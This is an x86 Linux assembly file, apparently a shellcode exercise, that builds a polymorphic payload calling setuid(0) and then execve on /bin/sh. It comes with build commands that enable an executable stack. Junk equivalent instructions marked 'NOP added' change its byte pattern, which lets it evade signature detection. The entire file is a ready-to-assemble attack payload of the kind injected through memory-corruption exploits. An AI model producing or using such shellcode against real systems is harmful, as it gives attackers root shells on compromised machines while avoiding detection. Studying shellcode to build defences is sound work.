; Polymorphic setuid(); execve(); exit();
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

; 
; $ nasm -f elf32 -o execve.o execve.nasm
; $ ld -z execstack -o execve execve.o
;
global _start			

section .text
_start:
    xor eax,eax
    mov ebx, eax            ; xor ebx,ebx
    mov ecx, ebx            ; xor ecx,ecx
    push 0x17               ; mov al,0x17
    pop ax
    xchg ecx, ecx           ; NOP added
    int 0x80                ; sys_setuid()

    xor eax,eax
    push eax
    mov dword [esp-4], 0x68732f6e ; push dword 0x68732f6e
    mov dword [esp-8], 0x69622f2f ; push dword 0x69622f2f
    sub esp, 8             ; increase the stack pointer
    mov ebx,esp
    lea edx,[esp+0x8]
    push eax
    push ebx
    lea ecx,[esp]
    mov al,0xb
    xor esi, esi            ; NOP added
    lea eax, [eax + esi]    ; NOP added
    int 0x80                ; execve()

    xor eax,eax
    mov al,0x1
    int 0x80                ; exit()

